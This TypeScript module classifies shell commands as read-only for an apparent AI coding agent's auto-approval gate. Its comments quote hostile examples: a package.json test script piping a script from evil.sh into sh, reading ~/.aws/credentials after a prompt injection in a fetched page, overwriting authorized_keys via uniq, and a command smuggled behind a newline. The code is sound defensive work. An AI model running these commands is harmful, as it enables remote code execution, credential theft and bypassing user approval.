/**
 * Bash read-only auto-allow — prefix rules for shell commands that are safe to
 * run without confirmation at auto-read autonomy and above.
 */
import { resolveWithin } from './workspaceJail.js';

/** Prefixes (after normalization) that indicate a read-only shell command. */
export const READ_ONLY_PREFIXES: readonly string[] = [
  'git status',
  'git log',
  'git diff',
  'git show',
  'git branch',
  'git rev-parse',
  'git describe',
  'git blame',
  'rg ',
  'rg\t',
  'grep ',
  'grep\t',
  'ls ',
  'ls\t',
  'ls',
  'cat ',
  'cat\t',
  'head ',
  'head\t',
  'tail ',
  'tail\t',
  'find ',
  'find\t',
  'docker ps',
  'docker images',
  'docker inspect',
  // NOT here (removed 2026-07-25): `npm test` / `npm run test` / `npm run -s test` / `pnpm test`
  // / `yarn test`. Running a test suite is an EXEC-risk action, not a read: the command that
  // actually runs is whatever the WORKSPACE's package.json says `scripts.test` is, so a merely
  // cloned repo declaring `"test": "curl -s https://evil.sh | sh"` got zero-interaction RCE the
  // moment the model did the obvious thing. `pre_tool_use` hooks and the denylist only ever see
  // the string `npm test`, never the payload. It now gates once and then rides the normal
  // session/prefix approval, so it costs one keypress per session and nothing after that.
  'pwd',
  'echo ',
  'which ',
  'wc ',
  'file ',
  'stat ',
  'du ',
  'tree ',
  'sort ',
  'uniq ',
  'id',
  'whoami',
  'date',
  'printenv',
  'type ',
  'command -v',
];

/** Destructive find sub-operations that disqualify read-only classification.
 *  `fprint\w*` (not `fprint`) so `-fprint0` and `-fprintf` — both of which write an arbitrary
 *  file — are caught; the old alternation required a delimiter right after `fprint` and missed
 *  every suffixed form. */
const FIND_DENY_RE = /(?:^|\s)-(?:exec|delete|ok|execdir|fls|fprint\w*)(?:\s|=|$)/i;

/**
 * Flags that make an otherwise-read-only command WRITE a file it names. The prefix list is a bare
 * `startsWith` match with no flag awareness, so every one of these classified as read-only and
 * auto-ran at `auto-read` — the level whose entire promise is that writes prompt. All verified
 * against the real binaries:
 *
 *   sort -o ~/.zshrc /tmp/payload        sort --output=src/index.ts /dev/null
 *   tree -o /tmp/out .                   git diff --output=src/index.ts
 *
 * None of them contain `>`, so the redirect guard above never saw them.
 */
const WRITE_FLAGS: ReadonlyArray<{ cmd: RegExp; flags: RegExp }> = [
  { cmd: /^sort\b/i, flags: /(?:^|\s)(?:-o|--output)(?:[=\s]|$)/i },
  { cmd: /^tree\b/i, flags: /(?:^|\s)(?:-o|--outfile)(?:[=\s]|$)/i },
  { cmd: /^git\s+(?:diff|show|log|format-patch)\b/i, flags: /(?:^|\s)--output(?:[=\s]|$)/i },
];

/**
 * `uniq [INPUT [OUTPUT]]` writes its SECOND positional argument — no flag involved, so the table
 * above cannot catch it. `uniq /tmp/payload ~/.ssh/authorized_keys` truncates and overwrites.
 * Count non-flag operands; two or more means it is being asked to write.
 */
function uniqWritesOutput(head: string): boolean {
  if (!/^uniq\b/i.test(head)) return false;
  const args = head.split(/\s+/).slice(1);
  const operands: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    if (a === '--') {
      operands.push(...args.slice(i + 1));
      break;
    }
    if (a.startsWith('-') && a !== '-') {
      // Flags that take a separate value (-f N, -s N, -w N) swallow the next token.
      if (/^-[fsw]$/i.test(a)) i++;
      continue;
    }
    operands.push(a);
  }
  return operands.length >= 2;
}

/** Commands whose operands are FILES TO READ — the ones worth scoping to the workspace. */
const READS_FILE_OPERANDS = /^(?:cat|head|tail|less|more|od|xxd|hexdump|strings|file|stat|wc|nl|base64)\b/i;

/**
 * Does this segment read a file OUTSIDE the granted roots? `cat`/`head`/`tail`/`stat` were
 * auto-allowed with no restriction whatsoever on their operands, so at the DEFAULT autonomy
 * `cat ~/.aws/credentials` ran unprompted and its contents became a tool result — i.e. they went
 * to the provider on the next turn. No malicious user is required: one injected line in a fetched
 * page or a cloned README is enough. That directly contradicts the privacy-first contract and
 * undoes the effort spent scrubbing `*_API_KEY` out of the child environment.
 *
 * Scoping only DEMOTES: an out-of-jail read stops being auto-allowed and falls through to the
 * normal permission gate, where the user can still approve it deliberately.
 */
function readsOutsideRoots(head: string, roots: readonly string[]): boolean {
  if (!roots.length) return false; // no roots configured → nothing to scope against
  if (!READS_FILE_OPERANDS.test(head)) return false;
  const args = head.split(/\s+/).slice(1);
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    if (a === '--') {
      if (args.slice(i + 1).some((op) => outsideRoots(op, roots))) return true;
      break;
    }
    if (a.startsWith('-') && a !== '-') continue; // a flag, not a path
    if (outsideRoots(a, roots)) return true;
  }
  return false;
}

function outsideRoots(operand: string, roots: readonly string[]): boolean {
  // A glob or a variable can expand to anything; refuse to vouch for it.
  if (/[*?[\]$~]/.test(operand)) return true;
  if (operand === '-' || operand === '/dev/null' || operand === '/dev/stdin') return false;
  try {
    resolveWithin(roots as string[], operand);
    return false;
  } catch {
    return true;
  }
}

/**
 * True when `command` is a read-only shell invocation (prefix match on a
 * normalized form). Every segment of a pipeline and every link of a `;`/`&`/
 * `&&`/`||` chain must independently be read-only.
 *
 * `roots` (workspace + any `--add-dir` grants) scopes the file-reading commands. Omit it and the
 * classification is command-shape only — every caller that can auto-RUN the result must pass it.
 */
export function isBashReadOnly(command: string, roots: readonly string[] = []): boolean {
  // A newline can smuggle a second command past a read-only-looking first line
  // (e.g. `echo ok\nbash evil.sh`), and normalization would collapse it to a
  // space and hide the boundary. Reject on the RAW command before normalizing.
  if (/[\r\n]/.test(command)) return false;

  const normalized = normalizeCommand(command);
  if (!normalized) return false;

  // Output redirection WRITES to a file — `echo secret > f` / `cmd >> f` / `cmd &> f` AND fd-numbered
  // `echo x 1> f` / `2> f` / `3> f` must never ride the read-only fast path (silent overwrite/truncate,
  // no approval). We ONLY exempt fd DUPLICATION (`2>&1`, `1>&2`, `>&2`, …) which points a descriptor at
  // another descriptor, not at a file. Strip the dup forms, then reject on ANY remaining `>`. (The old
  // `[^0-9&]>` guard exempted every digit-before-`>`, so `1> file` slipped through as read-only.)
  const withoutFdDup = normalized.replace(/\d*>&\d+/g, '');
  if (/>/.test(withoutFdDup)) return false;

  // A command substitution `$(...)`, legacy backticks, or process substitution
  // `<(...)`/`>(...)` can hide arbitrary work behind a read-only-looking prefix
  // (e.g. `grep x $(rm -rf ~)`). Such a command can never qualify for the
  // no-confirm fast path — it falls through to the permission gate / denylist
  // instead. (Plain `${VAR}` parameter expansion does not execute, so it stays.)
  if (/\$\(|`|<\(|>\(/.test(normalized)) return false;

  // Split the chain on `;`, `&` (background), `&&`, and `||`. Every link must
  // be read-only — a single mutating link disqualifies the whole command.
  const chainParts = normalized.split(/\s*(?:&&|\|\||;|&)\s*/);
  if (chainParts.length === 0) return false;

  for (const part of chainParts) {
    // Every stage of a pipeline must be read-only — `cat f | bash` is not.
    for (const segment of part.split(/\s*\|\s*/)) {
      const head = segment.trim();
      if (!head || !isReadOnlySegment(head)) return false;
      if (readsOutsideRoots(head, roots)) return false;
    }
  }
  return true;
}

function isReadOnlySegment(head: string): boolean {
  if (/^find\b/i.test(head) && FIND_DENY_RE.test(head)) return false;
  // A read-looking command carrying a write flag is a write.
  for (const { cmd, flags } of WRITE_FLAGS) {
    if (cmd.test(head) && flags.test(head)) return false;
  }
  if (uniqWritesOutput(head)) return false;
  // `git branch` is read-only only for LISTING — a delete/move/copy/force flag mutates refs
  // (branch deletion, history-losing renames) and must not auto-run.
  if (/^git\s+branch\b/.test(head) && /(?:^|\s)(?:-[dDmMcC]|-f|--(?:delete|move|copy|force))\b/.test(head)) {
    return false;
  }
  for (const prefix of READ_ONLY_PREFIXES) {
    if (head === prefix) return true;
    if (!head.startsWith(prefix)) continue;
    // Require a token boundary after the prefix so `ls` does not match
    // `lsof`/`lsblk` and `id` does not match `identify`. Prefixes that already
    // end in whitespace (e.g. `cat `) carry their own boundary.
    if (/\s$/.test(prefix)) return true;
    const nextChar = head[prefix.length];
    if (nextChar === ' ' || nextChar === '\t') return true;
  }
  return false;
}

function normalizeCommand(command: string): string {
  return command
    .trim()
    .replace(/^[#$]\s*/, '')
    .replace(/\s+/g, ' ');
}